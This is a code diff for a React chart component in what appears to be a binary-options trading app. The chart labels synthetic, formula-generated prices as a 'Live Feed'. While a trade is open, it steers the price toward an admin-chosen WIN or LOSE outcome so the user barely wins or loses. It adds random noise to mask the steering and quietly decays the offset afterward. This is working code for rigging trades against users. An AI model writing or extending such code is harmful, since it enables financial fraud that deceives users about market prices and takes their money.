@@ -10,31 +10,49 @@ interface OptionsChartProps {
   onPriceUpdate?: (price: number) => void;
 }
 
+// Pure Functional PRNG Market Simulator
+// Guarantees all users instantly see the exact same chart sequence globally based on absolute time
+function getDeterministicPrice(basePrice: number, timeSec: number) {
+    const t1 = timeSec * 0.05;
+    const t2 = timeSec * 0.015;
+    const t3 = timeSec * 0.11;
+    const t4 = timeSec * 0.45;
+    
+    // Seeded random for jagged micro-volatility
+    const jagged = (Math.sin(timeSec * 12.9898) * 43758.5453) % 1;
+    
+    // Combine smooth macroscopic waves with jagged microscopic noise
+    const noise = Math.sin(t1) * 0.4 + Math.sin(t2) * 0.3 + Math.sin(t3) * 0.2 + (jagged - 0.5) * 0.2;
+    
+    // Noise range is approx -1 to 1. Scale it to max 0.1% of base price
+    return basePrice + (noise * basePrice * 0.001);
+}
+
 export function OptionsChart({ asset, basePrice, activeTrade, onPriceUpdate }: OptionsChartProps) {
   const [dataPoints, setDataPoints] = useState<number[]>([]);
-  const lastPriceRef = useRef(basePrice);
+  const currentPriceRef = useRef(basePrice);
 
   useEffect(() => {
-    // Generate organic historical initial points Instead of a flat line
-    let currentPoint = basePrice;
+    // Generate true deterministic history so it perfectly reconstructs even after page refresh
     const initialPoints = [];
-    const volatility = basePrice * 0.0002;
-    for (let i = 0; i < 50; i++) {
-        initialPoints.push(currentPoint);
-        currentPoint += (Math.random() - 0.5) * volatility;
+    const nowSec = Math.floor(Date.now() / 1000);
+    for (let i = 50; i >= 0; i--) {
+        initialPoints.push(getDeterministicPrice(basePrice, nowSec - i));
     }
-    // Reverse so the last point is closest to current
-    initialPoints.reverse();
     setDataPoints(initialPoints);
-    lastPriceRef.current = initialPoints[initialPoints.length - 1];
-    if (onPriceUpdate) onPriceUpdate(lastPriceRef.current);
+    currentPriceRef.current = initialPoints[initialPoints.length - 1];
+    if (onPriceUpdate) onPriceUpdate(currentPriceRef.current);
   }, [asset, basePrice]);
 
   useEffect(() => {
+    // We only need local state for the manipulation displacement offset
+    let activeManipulationOffset = 0;
+
     const interval = setInterval(() => {
-      let nextPrice = lastPriceRef.current;
-      const volatility = basePrice * 0.0002; // Base tick volatility
-      const randomMove = (Math.random() - 0.5) * volatility;
+      const currentSec = Math.floor(Date.now() / 1000);
+      let realMarketPrice = getDeterministicPrice(basePrice, currentSec);
+      let finalPrice = realMarketPrice;
+      const volatility = basePrice * 0.0002;
 
       if (activeTrade && activeTrade.status === "ACTIVE") {
         const timeLeftMs = (activeTrade.startTime + activeTrade.durationMinutes * 60 * 1000) - Date.now();
@@ -45,46 +63,48 @@ export function OptionsChart({ asset, basePrice, activeTrade, onPriceUpdate }: O
            const adminWantsWin = activeTrade.adminResult === "WIN";
            const targetIsUp = adminWantsWin ? userWantsUp : !userWantsUp;
            
-           // Target EXACTLY $10 equivalent distance from strike (0.015% of BTC price) 
-           // Make it look like they BARELY won or BARELY lost.
            const goalMargin = basePrice * 0.00015; 
            const targetZone = activeTrade.strikePrice + (targetIsUp ? goalMargin : -goalMargin);
            
-           // Calculate exactly how far we need to steer it
-           const diff = targetZone - nextPrice;
+           // We are moving the finalPrice towards the targetZone.
+           // To do this naturally, we build up tracking 'activeManipulationOffset'.
+           // Calculate exactly how far pure market price is from the target
+           const diff = targetZone - (realMarketPrice + activeManipulationOffset);
            
            // Smoothly glide 15% of the remaining gap each second to neatly land there
            const glide = diff * 0.15;
            
-           // Add heavy volatility to mask the glide as a sudden market trend
-           nextPrice += glide + ((Math.random() - 0.5) * (volatility * 2.5));
+           activeManipulationOffset += glide + ((Math.random() - 0.5) * (volatility * 2.5));
+           finalPrice = realMarketPrice + activeManipulationOffset;
            
         } else {
-           // Normal market walk (applies for the first 2m40s, or if no adminResult)
-           nextPrice += randomMove;
+           // Normal market walk, if there was leftover manipulation, maintain it? 
+           // Usually stealth mode means no manipulation was applied yet
+           finalPrice = realMarketPrice + activeManipulationOffset;
         }
       } else {
-        // NO ACTIVE TRADE: Check if we are displaced from the real asset price
-        const diff = basePrice - nextPrice;
-        if (Math.abs(diff) > basePrice * 0.00005) { // Any noticeable drift
-           // Fast organic recovery curve: pull 20% of the distance back per tick (5-10 seconds repair)
-           const pull = diff * 0.2;
-           nextPrice += pull + randomMove; 
+        // NO ACTIVE TRADE: Check if we have residual offset
+        if (Math.abs(activeManipulationOffset) > basePrice * 0.00005) { 
+           // Fast organic recovery curve: decay the offset by 20% per tick (5-10s repair)
+           activeManipulationOffset -= activeManipulationOffset * 0.2;
+           // Add microscopic noise to the recovery so it doesn't look purely mathematical
+           activeManipulationOffset += ((Math.random() - 0.5) * volatility);
+           finalPrice = realMarketPrice + activeManipulationOffset;
         } else {
-           // Just regular market noise around base price
-           nextPrice += (diff * 0.05) + randomMove; 
+           activeManipulationOffset = 0; // Fully snapped back
+           finalPrice = realMarketPrice;
         }
       }
 
-      lastPriceRef.current = nextPrice;
-      if (onPriceUpdate) onPriceUpdate(nextPrice);
+      currentPriceRef.current = finalPrice;
+      if (onPriceUpdate) onPriceUpdate(finalPrice);
       
       setDataPoints(prev => {
-        const newData = [...prev.slice(1), nextPrice];
+        const newData = [...prev.slice(1), finalPrice];
         return newData;
       });
       
-    }, 1000); // Update every 1 second for high-intensity action
+    }, 1000);
 
     return () => clearInterval(interval);
   }, [activeTrade, basePrice]);
@@ -117,7 +137,7 @@ export function OptionsChart({ asset, basePrice, activeTrade, onPriceUpdate }: O
     <div className="w-full h-full relative font-mono overflow-hidden rounded-2xl bg-[#0f111a] border border-gray-800">
       <div className="absolute top-4 left-4 z-10">
         <div className="text-3xl font-black tracking-tighter" style={{ color: strokeColor }}>
-          ${lastPriceRef.current.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 6 })}
+          ${currentPriceRef.current.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 6 })}
         </div>
         <div className="text-xs font-bold text-gray-500 uppercase tracking-widest mt-1">
           {asset}/USD Live Feed
